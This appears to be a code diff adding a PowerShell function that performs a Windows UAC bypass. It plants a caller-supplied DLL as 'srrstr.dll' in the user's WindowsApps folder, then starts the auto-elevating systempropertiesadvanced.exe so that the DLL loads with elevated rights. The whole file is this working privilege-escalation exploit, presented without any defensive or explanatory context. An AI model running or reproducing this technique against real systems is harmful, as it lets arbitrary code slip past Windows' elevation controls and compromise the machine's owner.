@@ -1,0 +1,27 @@
+function invoke-systempropertiesadvanced{
+        param(
+            [Parameter(Mandatory)]
+            [string] $dll,
+            [Parameter(Mandatory)]
+            [String] $user
+        )
+    
+    #Data
+    $dll_name = "srrstr.dll"
+    $path = "C:\Users\$user\AppData\Local\Microsoft\WindowsApps"
+    $dest = "$path\$dll_name"
+   
+   #Check folder
+    $exist = Test-Path -Path $path
+    if (-not $exist) {
+        mkdir $path
+    }
+    if (-not (Test-Path $dll)){
+        printMessage -message "DLL not found"
+        return
+    }
+    Copy-Item $dll $dest
+
+   #Run Process
+   Start-Process C:\windows\syswow64\systempropertiesadvanced.exe
+}
